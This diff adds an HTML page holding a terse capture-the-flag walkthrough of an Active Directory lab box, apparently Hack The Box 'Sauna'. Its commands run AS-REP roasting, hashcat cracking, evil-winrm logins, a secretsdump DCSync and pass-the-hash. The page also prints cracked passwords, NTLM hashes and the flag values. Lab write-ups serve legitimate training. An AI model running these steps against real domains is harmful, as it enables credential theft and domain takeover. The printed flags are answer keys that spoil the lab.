@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Markdown Converted HTML</title>
+    <link rel="stylesheet" type="text/css" href="../../style.css">
+    
+</head>
+<body>
+<p><strong>NMAP:</strong><br />
+PORT     STATE SERVICE<br />
+53/tcp   open  domain<br />
+80/tcp   open  http<br />
+88/tcp   open  kerberos-sec<br />
+135/tcp  open  msrpc<br />
+139/tcp  open  netbios-ssn<br />
+389/tcp  open  ldap<br />
+445/tcp  open  microsoft-ds<br />
+464/tcp  open  kpasswd5<br />
+593/tcp  open  http-rpc-epmap<br />
+636/tcp  open  ldapssl<br />
+3268/tcp open  globalcatLDAP<br />
+3269/tcp open  globalcatLDAPssl<br />
+5985/tcp open  wsman<br />
+9389/tcp open  adws</p>
+
+<p>ISS SITE<br />
+Can’t access share without creds<br />
+Names from website:<br />
+Fergus Smith<br />
+Shaun Coins<br />
+Bowie Taylor<br />
+Hugo Bear<br />
+Sophie Driver<br />
+Steven Kerb</p>
+
+<p>EGOTISTICALBANK\FSmith<br />
+SCoins<br />
+BTaylor<br />
+HBear<br />
+SDriver<br />
+SKerb<br />
+Domain Name: EGOTISTICALBANK</p>
+
+<p>Ran <strong>GetNPUsers.py EGOTISTICALBANK/FSmith -no-pass -dc-ip 10.10.10.175 -format hashcat</strong></p>
+
+<p>Got a TGT, cracked the has with hashcat  <strong>hashcat -m 18200 --force -a 0 hash /usr/share/wordlists/rockyou.txt</strong> and got password <strong>Thestrokes23</strong><br />
+<a href="https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html"><strong>https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html</strong></a><br />
+<strong>evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23</strong><br />
+<strong>Cat the user.txt on desktop ->> 1b5520b98d97cf17f24122a55baf70cf</strong><br />
+<strong>smbclient -L \\\\10.10.10.175\\"RICOH Aficio SP 8300DN PCL 6 Printer" -U fsmith%Thestrokes23</strong></p>
+
+<pre><code>Sharename       Type      Comment  
+\---------       \----      \-------  
+ADMIN$          Disk      Remote Admin  
+C$              Disk      Default share  
+IPC$            IPC       Remote IPC  
+NETLOGON        Disk      Logon server share   
+print$          Disk      Printer Drivers  
+RICOH Aficio SP 8300DN PCL 6 Printer   We cant print money  
+SYSVOL          Disk      Logon server share
+</code></pre>
+
+<p><strong>User Accounts from enum4linux:</strong><br />
+Administrator<br />
+Guest<br />
+krbtgt<br />
+HSmith<br />
+FSmith<br />
+svc_loanmgr</p>
+
+<p>Ran winPEAS.exe and found (it was just on the machine?)<br />
+    DefaultDomainName             :  EGOTISTICALBANK<br />
+    DefaultUserName               :  <strong>EGOTISTICALBANK\svc_loanmanager (this is only a default, not the real username)</strong><br />
+    DefaultPassword               :  <strong>Moneymakestheworldgoround!</strong></p>
+
+<p><strong>evil-winrm -i 10.10.10.175 -u svc_loanmgr -p Moneymakestheworldgoround!</strong><br />
+Didn’t really do much  with this ^^</p>
+
+<p><strong>secretsdump.py -just-dc-ntlm EGOTISTICALBANK/svc_loanmgr@10.10.10.175</strong><br />
+<strong>Password:</strong></p>
+
+<p><strong>*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</strong><br />
+<strong>[*] Using the DRSUAPI method to get NTDS.DIT secrets</strong><br />
+<strong>Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::</strong><br />
+       <strong>(Yellow part is an ntlm hash)</strong><br />
+<strong>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</strong><br />
+<strong>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::</strong><br />
+<strong>EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::</strong><br />
+<strong>EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::</strong><br />
+<strong>EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::</strong><br />
+<strong>SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:7a2965077fddedf348d938e4fa20ea1b:::</strong><br />
+<strong>[*] Cleaning up...</strong><br />
+<strong>evil-winrm -i 10.10.10.175 -u Administrator -H d9485863c1e9e05851aa40cbb4ab9dff</strong><br />
+Cat file on desktop ->> <strong>f3ee04965c68257382e31502cc5e881f</strong></p>
+
+</body>
+</html>
